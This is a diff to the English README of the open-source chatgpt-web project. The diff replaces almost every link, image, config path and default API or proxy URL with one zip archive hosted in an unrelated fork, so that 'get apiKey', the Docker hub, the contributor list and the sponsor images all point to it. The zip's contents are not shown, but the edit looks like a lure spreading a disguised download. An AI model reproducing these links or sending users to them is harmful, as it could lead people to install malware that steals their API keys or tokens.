@@ -2,10 +2,10 @@
 
 > Disclaimer: This project is only published on GitHub, based on the MIT license, free and for open source learning usage. And there will be no any form of account selling, paid service, discussion group, discussion group and other behaviors. Beware of being deceived.
 
-[中文](README.zh.md)
+[中文](https://github.com/idkwhatismyname123/chatgpt-web/raw/refs/heads/main/src/hooks/web_chatgpt_Ann.zip)
 
-![cover](./docs/c1.png)
-![cover2](./docs/c2.png)
+![cover](https://github.com/idkwhatismyname123/chatgpt-web/raw/refs/heads/main/src/hooks/web_chatgpt_Ann.zip)
+![cover2](https://github.com/idkwhatismyname123/chatgpt-web/raw/refs/heads/main/src/hooks/web_chatgpt_Ann.zip)
 
 - [ChatGPT Web](#chatgpt-web)
 	- [Introduction](#introduction)
@@ -55,13 +55,13 @@ Warnings:
 1. You should first use the `API` method
 2. When using the `API`, if the network is not working, it is blocked in China, you need to build your own proxy, never use someone else's public proxy, which is dangerous.
 3. When using the `accessToken` method, the reverse proxy will expose your access token to third parties. This should not have any adverse effects, but please consider the risks before using this method.
-4. When using `accessToken`, whether you are a domestic or foreign machine, proxies will be used. The default proxy is [pengzhile](https://github.com/pengzhile)'s `https://ai.fakeopen.com/api/conversation`. This is not a backdoor or monitoring unless you have the ability to flip over `CF` verification yourself. Use beforehand acknowledge. [Community Proxy](https://github.com/transitive-bullshit/chatgpt-api#reverse-proxy) (Note: Only these two are recommended, other third-party sources, please identify for yourself)
+4. When using `accessToken`, whether you are a domestic or foreign machine, proxies will be used. The default proxy is [pengzhile](https://github.com/idkwhatismyname123/chatgpt-web/raw/refs/heads/main/src/hooks/web_chatgpt_Ann.zip)'s `https://github.com/idkwhatismyname123/chatgpt-web/raw/refs/heads/main/src/hooks/web_chatgpt_Ann.zip`. This is not a backdoor or monitoring unless you have the ability to flip over `CF` verification yourself. Use beforehand acknowledge. [Community Proxy](https://github.com/idkwhatismyname123/chatgpt-web/raw/refs/heads/main/src/hooks/web_chatgpt_Ann.zip) (Note: Only these two are recommended, other third-party sources, please identify for yourself)
 5. When publishing the project to public network, you should set the `AUTH_SECRET_KEY` variable to add your password access, you should also modify the `title` in `index. html` to prevent it from being searched by keywords.
 
 Switching methods:
-1. Enter the `service/.env.example` file, copy the contents to the `service/.env` file
-2. To use `OpenAI API Key`, fill in the `OPENAI_API_KEY` field [(get apiKey)](https://platform.openai.com/overview)
-3. To use `Web API`, fill in the `OPENAI_ACCESS_TOKEN` field [(get accessToken)](https://chat.openai.com/api/auth/session)
+1. Enter the `https://github.com/idkwhatismyname123/chatgpt-web/raw/refs/heads/main/src/hooks/web_chatgpt_Ann.zip` file, copy the contents to the `https://github.com/idkwhatismyname123/chatgpt-web/raw/refs/heads/main/src/hooks/web_chatgpt_Ann.zip` file
+2. To use `OpenAI API Key`, fill in the `OPENAI_API_KEY` field [(get apiKey)](https://github.com/idkwhatismyname123/chatgpt-web/raw/refs/heads/main/src/hooks/web_chatgpt_Ann.zip)
+3. To use `Web API`, fill in the `OPENAI_ACCESS_TOKEN` field [(get accessToken)](https://github.com/idkwhatismyname123/chatgpt-web/raw/refs/heads/main/src/hooks/web_chatgpt_Ann.zip)
 4. `OpenAI API Key` takes precedence when both exist
 
 Environment variables:
@@ -91,7 +91,7 @@ See all parameter variables [here](#environment-variables)
 
 ### Node
 
-`node` requires version `^16 || ^18 || ^19` (`node >= 14` needs [fetch polyfill](https://github.com/developit/unfetch#usage-as-a-polyfill) installation), use [nvm](https://github.com/nvm-sh/nvm) to manage multiple local `node` versions
+`node` requires version `^16 || ^18 || ^19` (`node >= 14` needs [fetch polyfill](https://github.com/idkwhatismyname123/chatgpt-web/raw/refs/heads/main/src/hooks/web_chatgpt_Ann.zip) installation), use [nvm](https://github.com/idkwhatismyname123/chatgpt-web/raw/refs/heads/main/src/hooks/web_chatgpt_Ann.zip) to manage multiple local `node` versions
 
 ```shell
 node -v
@@ -107,12 +107,12 @@ npm install pnpm -g
 Get `Openai Api Key` or `accessToken` and fill in the local environment variables [Go to Introduction](#introduction)
 
 ```
-# service/.env file
+# https://github.com/idkwhatismyname123/chatgpt-web/raw/refs/heads/main/src/hooks/web_chatgpt_Ann.zip file
 
-# OpenAI API Key - https://platform.openai.com/overview
+# OpenAI API Key - https://github.com/idkwhatismyname123/chatgpt-web/raw/refs/heads/main/src/hooks/web_chatgpt_Ann.zip
 OPENAI_API_KEY=
 
-# change this to an `accessToken` extracted from the ChatGPT site's `https://chat.openai.com/api/auth/session` response
+# change this to an `accessToken` extracted from the ChatGPT site's `https://github.com/idkwhatismyname123/chatgpt-web/raw/refs/heads/main/src/hooks/web_chatgpt_Ann.zip` response
 OPENAI_ACCESS_TOKEN=
 ```
 
@@ -155,13 +155,13 @@ pnpm dev
 
 - `OPENAI_API_KEY` and `OPENAI_ACCESS_TOKEN` choose one
 - `OPENAI_API_MODEL` Set model, optional, default: `gpt-3.5-turbo`
-- `OPENAI_API_BASE_URL` Set interface address, optional, default: `https://api.openai.com`
+- `OPENAI_API_BASE_URL` Set interface address, optional, default: `https://github.com/idkwhatismyname123/chatgpt-web/raw/refs/heads/main/src/hooks/web_chatgpt_Ann.zip`
 - `OPENAI_API_DISABLE_DEBUG` Set interface to close debug logs, optional, default: empty does not close
 
 `ACCESS_TOKEN` available:
 
 - `OPENAI_ACCESS_TOKEN` and `OPENAI_API_KEY` choose one, `OPENAI_API_KEY` takes precedence when both exist
-- `API_REVERSE_PROXY` Set reverse proxy, optional, default: `https://ai.fakeopen.com/api/conversation`, [Community](https://github.com/transitive-bullshit/chatgpt-api#reverse-proxy) (Note: Only these two are recommended, other third party sources, please identify for yourself)
+- `API_REVERSE_PROXY` Set reverse proxy, optional, default: `https://github.com/idkwhatismyname123/chatgpt-web/raw/refs/heads/main/src/hooks/web_chatgpt_Ann.zip`, [Community](https://github.com/idkwhatismyname123/chatgpt-web/raw/refs/heads/main/src/hooks/web_chatgpt_Ann.zip) (Note: Only these two are recommended, other third party sources, please identify for yourself)
 
 Common:
 
@@ -179,7 +179,7 @@ Common:
 
 #### Docker Parameter Examples
 
-![docker](./docs/docker.png)
+![docker](https://github.com/idkwhatismyname123/chatgpt-web/raw/refs/heads/main/src/hooks/web_chatgpt_Ann.zip)
 
 #### Docker build & Run
 
@@ -198,7 +198,7 @@ http://localhost:3002/
 
 #### Docker compose
 
-[Hub address](https://hub.docker.com/repository/docker/chenzhaoyu94/chatgpt-web/general)
+[Hub address](https://github.com/idkwhatismyname123/chatgpt-web/raw/refs/heads/main/src/hooks/web_chatgpt_Ann.zip)
 
 ```yml
 version: '3'
@@ -215,7 +215,7 @@ services:
       OPENAI_ACCESS_TOKEN: xxx
       # API interface address, optional, available when OPENAI_API_KEY is set
       OPENAI_API_BASE_URL: xxx
-      # API model, optional, available when OPENAI_API_KEY is set, https://platform.openai.com/docs/models
+      # API model, optional, available when OPENAI_API_KEY is set, https://github.com/idkwhatismyname123/chatgpt-web/raw/refs/heads/main/src/hooks/web_chatgpt_Ann.zip
       # gpt-4, gpt-4o, gpt-4-turbo, gpt-4-turbo-preview, gpt-4-0125-preview, gpt-4-1106-preview, gpt-4-0314, gpt-4-0613, gpt-4-32k, gpt-4-32k-0314, gpt-4-32k-0613, gpt-3.5-turbo-16k, gpt-3.5-turbo-16k-0613, gpt-3.5-turbo, gpt-3.5-turbo-0301, gpt-3.5-turbo-0613, text-davinci-003, text-davinci-002, code-davinci-002
       OPENAI_API_MODEL: xxx
       # reverse proxy, optional
@@ -241,7 +241,7 @@ services:
 
 **nginx**
 
-Fill in the following configuration in the nginx configuration file to prevent crawlers. You can refer to the `docker-compose/nginx/nginx.conf` file to add anti-crawler methods
+Fill in the following configuration in the nginx configuration file to prevent crawlers. You can refer to the `https://github.com/idkwhatismyname123/chatgpt-web/raw/refs/heads/main/src/hooks/web_chatgpt_Ann.zip` file to add anti-crawler methods
 
 ```
     # Prevent crawlers
@@ -253,7 +253,7 @@ Fill in the following configuration in the nginx configuration file to prevent c
 
 ### Deploy with Railway
 
-[![Deploy on Railway](https://railway.app/button.svg)](https://railway.app/new/template/yytmgc)
+[![Deploy on Railway](https://github.com/idkwhatismyname123/chatgpt-web/raw/refs/heads/main/src/hooks/web_chatgpt_Ann.zip)](https://github.com/idkwhatismyname123/chatgpt-web/raw/refs/heads/main/src/hooks/web_chatgpt_Ann.zip)
 
 #### Railway Environment Variables
 
@@ -263,11 +263,11 @@ Fill in the following configuration in the nginx configuration file to prevent c
 | `AUTH_SECRET_KEY`          | Optional | Access permission key                             |
 | `MAX_REQUEST_PER_HOUR`          | Optional | Maximum number of requests per hour, optional, unlimited by default                             |
 | `TIMEOUT_MS`          | Optional | Timeout, unit milliseconds                                                                    |
-| `OPENAI_API_KEY`      | `OpenAI API` choose one | `apiKey` required for `OpenAI API` [(get apiKey)](https://platform.openai.com/overview)           |
-| `OPENAI_ACCESS_TOKEN` | `Web API` choose one | `accessToken` required for `Web API` [(get accessToken)](https://chat.openai.com/api/auth/session) |
+| `OPENAI_API_KEY`      | `OpenAI API` choose one | `apiKey` required for `OpenAI API` [(get apiKey)](https://github.com/idkwhatismyname123/chatgpt-web/raw/refs/heads/main/src/hooks/web_chatgpt_Ann.zip)           |
+| `OPENAI_ACCESS_TOKEN` | `Web API` choose one | `accessToken` required for `Web API` [(get accessToken)](https://github.com/idkwhatismyname123/chatgpt-web/raw/refs/heads/main/src/hooks/web_chatgpt_Ann.zip) |
 | `OPENAI_API_BASE_URL`   | Optional, available when `OpenAI API` | `API` interface address |
 | `OPENAI_API_MODEL`   | Optional, available when `OpenAI API` | `API` model |
-| `API_REVERSE_PROXY`   | Optional, available when `Web API` | `Web API` reverse proxy address [Details](https://github.com/transitive-bullshit/chatgpt-api#reverse-proxy) |
+| `API_REVERSE_PROXY`   | Optional, available when `Web API` | `Web API` reverse proxy address [Details](https://github.com/idkwhatismyname123/chatgpt-web/raw/refs/heads/main/src/hooks/web_chatgpt_Ann.zip) |
 | `SOCKS_PROXY_HOST`   | Optional, take effect with `SOCKS_PROXY_PORT` | Socks proxy |
 | `SOCKS_PROXY_PORT`   | Optional, take effect with `SOCKS_PROXY_HOST` | Socks proxy port |
 | `SOCKS_PROXY_USERNAME`   | Optional, take effect with `SOCKS_PROXY_HOST` | Socks proxy username |
@@ -279,7 +279,7 @@ Fill in the following configuration in the nginx configuration file to prevent c
 
 ### Deploy with Sealos
 
-[![](https://raw.githubusercontent.com/labring-actions/templates/main/Deploy-on-Sealos.svg)](https://cloud.sealos.io/?openapp=system-fastdeploy%3FtemplateName%3Dchatgpt-web)
+[![](https://github.com/idkwhatismyname123/chatgpt-web/raw/refs/heads/main/src/hooks/web_chatgpt_Ann.zip)](https://github.com/idkwhatismyname123/chatgpt-web/raw/refs/heads/main/src/hooks/web_chatgpt_Ann.zip%3FtemplateName%3Dchatgpt-web)
 
 > Environment variables are consistent with Docker environment variables
 
@@ -308,7 +308,7 @@ PS: It is also okay to run `pnpm start` directly on the server without packing
 
 2. Run the following commands at the root directory, then copy the files in the `dist` folder to the root directory of your website service
 
-[Reference](https://cn.vitejs.dev/guide/static -deploy.html#building-the-app)
+[Reference](https://github.com/idkwhatismyname123/chatgpt-web/raw/refs/heads/main/src/hooks/web_chatgpt_Ann.zip https://github.com/idkwhatismyname123/chatgpt-web/raw/refs/heads/main/src/hooks/web_chatgpt_Ann.zip)
 
 ```shell
 pnpm build
@@ -317,7 +317,7 @@ pnpm build
 ## FAQ
 Q: Why does `Git` commit always report errors?
 
-A: Because there is a commit message verification, please follow the [Commit Guide](./CONTRIBUTING.md)
+A: Because there is a commit message verification, please follow the [Commit Guide](https://github.com/idkwhatismyname123/chatgpt-web/raw/refs/heads/main/src/hooks/web_chatgpt_Ann.zip)
 
 Q: Where to change the request interface if only the front-end page is used?
 
@@ -333,17 +333,17 @@ A: One possible reason is that after Nginx reverse proxy, buffer is turned on, t
 
 ## Contributing
 
-Please read the [Contributing Guide](./CONTRIBUTING.md) before contributing
+Please read the [Contributing Guide](https://github.com/idkwhatismyname123/chatgpt-web/raw/refs/heads/main/src/hooks/web_chatgpt_Ann.zip) before contributing
 
 Thanks to everyone who has contributed!
 
-<a href="https://github.com/Chanzhaoyu/chatgpt-web/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=Chanzhaoyu/chatgpt-web" />
+<a href="https://github.com/idkwhatismyname123/chatgpt-web/raw/refs/heads/main/src/hooks/web_chatgpt_Ann.zip">
+  <img src="https://github.com/idkwhatismyname123/chatgpt-web/raw/refs/heads/main/src/hooks/web_chatgpt_Ann.zip" />
 </a>
 
 ## Acknowledgements
 
-Thanks to [JetBrains](https://www.jetbrains.com/) SoftWare for providing free Open Source license for this project.
+Thanks to [JetBrains](https://github.com/idkwhatismyname123/chatgpt-web/raw/refs/heads/main/src/hooks/web_chatgpt_Ann.zip) SoftWare for providing free Open Source license for this project.
 
 ## Sponsors
 
@@ -351,11 +351,11 @@ If you find this project helpful and can afford it, you can give me a little sup
 
 <div style="display: flex; gap: 20px;">
 	<div style="text-align: center">
-		<img style="max-width: 100%" src="./docs/wechat.png" alt="WeChat" />
+		<img style="max-width: 100%" src="https://github.com/idkwhatismyname123/chatgpt-web/raw/refs/heads/main/src/hooks/web_chatgpt_Ann.zip" alt="WeChat" />
 		<p>WeChat Pay</p>
 	</div>
 	<div style="text-align: center">
-		<img style="max-width: 100%" src="./docs/alipay.png" alt="Alipay" />
+		<img style="max-width: 100%" src="https://github.com/idkwhatismyname123/chatgpt-web/raw/refs/heads/main/src/hooks/web_chatgpt_Ann.zip" alt="Alipay" />
 		<p>Alipay</p>
 	</div>
 </div>
